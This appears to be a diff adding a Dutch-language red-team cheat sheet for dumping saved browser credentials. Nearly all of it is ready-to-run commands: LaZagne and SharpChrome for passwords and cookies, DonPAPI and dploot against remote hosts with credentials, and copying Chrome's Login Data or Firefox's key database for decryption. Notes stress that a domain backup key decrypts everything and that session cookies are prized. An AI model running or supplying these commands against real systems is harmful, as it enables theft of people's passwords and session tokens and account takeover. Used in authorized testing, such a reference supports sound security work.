@@ -1,0 +1,38 @@
+# Browser Password Dumping — Opgeslagen wachtwoorden uit browsers
+# Chrome, Edge, Firefox, Opera — allemaal via DPAPI of NSS
+#
+# === Vereisten ===
+# - Toegang als de user wiens wachtwoorden je wilt (of local admin + DPAPI key)
+#
+# === Voorbeelden ===
+
+# LaZagne - Alle applicatie wachtwoorden
+.\LaZagne.exe all
+
+# LaZagne - Alleen browsers
+.\LaZagne.exe browsers
+
+# SharpChrome - Chrome/Edge wachtwoorden + cookies
+.\SharpChrome.exe logins
+.\SharpChrome.exe cookies
+
+# SharpChrome - Met DPAPI domain backup key
+.\SharpChrome.exe logins /pvk:domain_backup_key.pvk
+
+# DonPAPI - Remote browser credentials via DPAPI
+python3 DonPAPI.py DOMAIN/USER:'PASS'@TARGET_IP
+
+# dploot - Remote browser secrets
+python3 dploot browser -u USER -p 'PASS' -d DOMAIN TARGET_IP
+
+# Handmatig Chrome login data kopiëren (als de user)
+copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" C:\temp\logindata.db
+# Decrypt met DPAPI masterkey of domain backup key
+
+# Firefox - NSS database (key4.db + logins.json)
+# Locatie: %APPDATA%\Mozilla\Firefox\Profiles\*.default\
+python3 firefox_decrypt.py
+
+# Noot: Chrome/Edge gebruiken DPAPI — domain backup key decryptert alles
+# Noot: Firefox gebruikt eigen NSS database — apart decryptieproces
+# Noot: Cookies bevatten vaak sessietokens die waardevoller zijn dan wachtwoorden
